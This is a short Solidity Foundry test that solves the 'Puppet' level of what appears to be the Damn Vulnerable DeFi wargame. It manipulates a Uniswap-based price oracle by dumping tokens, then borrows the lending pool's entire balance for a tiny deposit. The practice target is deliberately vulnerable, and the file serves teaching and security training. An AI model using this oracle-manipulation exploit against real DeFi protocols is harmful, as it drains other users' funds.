// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../../src/puppet/PuppetLevel.sol";

interface IPuppetPool {
  function borrow(uint256, address) external payable;
  function calculateDepositRequired(uint256) external view returns (uint256);
}

contract PuppetTest is Test {
  PuppetLevel level = new PuppetLevel();

  function setUp() public {
    level.setup();
  }

  function testExploit() public {
    IPuppetPool lendingPool = IPuppetPool(address(level.lendingPool()));
    DamnValuableToken token = DamnValuableToken(address(level.token()));
    IUniswapExchange uniswapExchange = IUniswapExchange(address(level.uniswapExchange()));

    token.approve(address(uniswapExchange), 1000e18);
    uniswapExchange.tokenToEthSwapInput(1000e18, 1, block.timestamp * 2);

    lendingPool.borrow
      {value: lendingPool.calculateDepositRequired(100_000e18)}
        (100_000e18, address(this));

    level.validate();
  }

  receive() external payable {}
}
